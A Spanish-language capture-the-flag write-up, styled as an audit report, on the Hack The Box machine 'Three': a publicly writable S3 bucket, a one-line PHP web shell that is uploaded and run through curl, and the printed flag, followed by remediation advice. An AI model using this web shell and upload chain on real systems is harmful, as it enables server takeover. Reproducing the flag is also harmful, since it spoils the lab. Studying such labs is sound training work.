Informe de Auditoría de Seguridad: Proyecto "Three"

ID de Máquina: Three (Hack The Box - Starting Point)

Clasificación de Riesgo: Crítico (RCE mediante mala configuración de S3)
1. Resumen Ejecutivo

El objetivo de esta auditoría fue evaluar la seguridad de la infraestructura del dominio thetoppers.htb. Durante el proceso, se descubrió un servicio de almacenamiento en la nube (S3) expuesto públicamente con permisos de lectura y escritura para usuarios anónimos. Esta vulnerabilidad permitió la carga de una web shell, logrando Ejecución Remota de Comandos (RCE) y el compromiso total del servidor web.
2. Inventario de Herramientas (Tooling)

Para este ejercicio se emplearon las siguientes herramientas de la suite de Kali Linux:

    Nmap: Escaneo de puertos y detección de servicios.

    Nano/Echo: Creación de scripts de explotación.

    FFUF/Gobuster: Descubrimiento de subdominios y directorios.

    AWS CLI (aws): Interacción y gestión de buckets S3.

    Curl: Comunicación con el servidor web para la ejecución de comandos.

3. Fase de Reconocimiento y Enumeración
3.1 Escaneo de Infraestructura

Se inició con un escaneo exhaustivo de los 65,535 puertos TCP para identificar la superficie de ataque.
Bash

nmap -p- --min-rate 5000 10.129.94.41

Resultado:

    Puerto 22/tcp: SSH activo.

    Puerto 80/tcp: Servidor web Apache activo.

3.2 Configuración de Resolución de Nombres

Debido a la falta de un servidor DNS, se procedió a registrar el dominio en el archivo local de resolución de nombres:
Bash

echo "10.129.94.41 thetoppers.htb" >> /etc/hosts

3.3 Enumeración de Subdominios

Utilizando técnicas de fuzzing sobre el dominio principal, se identificó un subdominio crítico:

    Subdominio detectado: s3.thetoppers.htb
    Este nombre sugiere la presencia de un servicio de almacenamiento compatible con Amazon S3.

4. Análisis de Vulnerabilidades en la Nube
4.1 Configuración de AWS CLI

Para interactuar con el subdominio, se configuró la herramienta aws con valores arbitrarios, ya que el servicio no requería autenticación real:
Bash

aws configure
# Access Key/Secret: temp | Region: temp

4.2 Auditoría del Bucket S3

Se verificó que el bucket tenía permisos de listado público:
Bash

aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

Hallazgo: El listado reveló archivos sensibles como index.php y .htaccess, confirmando que el contenido del bucket es el mismo que sirve el servidor web principal.
5. Explotación y Acceso Inicial (RCE)
5.1 Creación de Web Shell

Se desarrolló un script minimalista en PHP para permitir el paso de comandos del sistema a través de parámetros de URL:
PHP

<?php system($_GET["cmd"]); ?>

5.2 Carga de Payload

Aprovechando los permisos de escritura del bucket, se subió el archivo al servidor:
Bash

aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

5.3 Ejecución de Comandos

Se confirmó el acceso mediante una petición HTTP al archivo cargado, obteniendo la identidad del usuario del servidor:

    Comando: curl http://thetoppers.htb/shell.php?cmd=id

    Respuesta: uid=33(www-data) gid=33(www-data)

6. Post-Explotación y Exfiltración

Con el control del servidor, se realizó una búsqueda del objetivo (la bandera):

    Búsqueda: find / -name flag.txt -> Localizado en /var/www/flag.txt.

    Lectura: cat /var/www/flag.txt

    Resultado: a980d99281a28d638ac68b9bf9453c2b

7. Plan de Remediación

    Cierre de permisos S3: Configurar las políticas del bucket para prohibir el acceso AuthenticatedUsers o AllUsers.

    Hardening de PHP: Deshabilitar funciones peligrosas (system, shell_exec) en el archivo php.ini.

    Seguridad del Sistema de Archivos: Cambiar el propietario de /var/www/html a root y permitir que www-data tenga únicamente permisos de lectura.
